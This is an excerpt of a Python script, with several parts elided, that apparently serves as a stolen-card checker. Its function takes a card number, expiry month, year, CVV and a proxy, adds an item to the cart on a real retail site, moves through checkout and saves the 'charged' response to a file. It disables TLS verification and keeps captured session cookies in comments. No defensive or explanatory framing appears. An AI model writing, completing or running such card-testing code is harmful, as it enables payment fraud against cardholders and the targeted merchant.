...
async def authnet11(cc, mes, ano, cvv,proxyg):
    async with AsyncClient(follow_redirects=True, verify=False, proxies=proxyg, timeout=None) as s:
        ...
        headers = {
            ...
            # 'Cookie': 'xid_4069d=b823c4c7cc9713a2dad2ab33c4fbb90a; store_language=en; ui-tabs-1=0; __utmc=215864212; __utmz=215864212.1731230969.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); RefererCookie=https%3A%2F%2Fwww.redco.com%2F; __utma=215864212.1135948131.1731230969.1731230969.1731234137.2; __utmt=1; __utmb=215864212.4.10.1731234137',
        ...
        data = {
            ...
            'productid': '18397',
            'price': '',
            'label_data': '[{"type":1,"pos":0,"color":"Black","text":"","quantity":1}]',
            'amount': '1',
        }

        req1 = await s.post('https://www.redco.com/cart.php', headers=headers, data=data)


        req2 = await s.get('https://www.redco.com/cart.php?mode=checkout')
        ...
        headers = {
            ...
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded',
            # 'Cookie': 'xid_4069d=b823c4c7cc9713a2dad2ab33c4fbb90a; store_language=en; __utmc=215864212; __utmz=215864212.1731230969.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); RefererCookie=https%3A%2F%2Fwww.redco.com%2F; __utma=215864212.1135948131.1731230969.1731230969.1731234137.2; __utmt=1; __utmb=215864212.11.10.1731234137',
            'Origin': 'https://www.redco.com',
            'Pragma': 'no-cache',
        ...
        with open("respcharged.txt", "+w",encoding="utf-8") as u:u.write(req12.text)
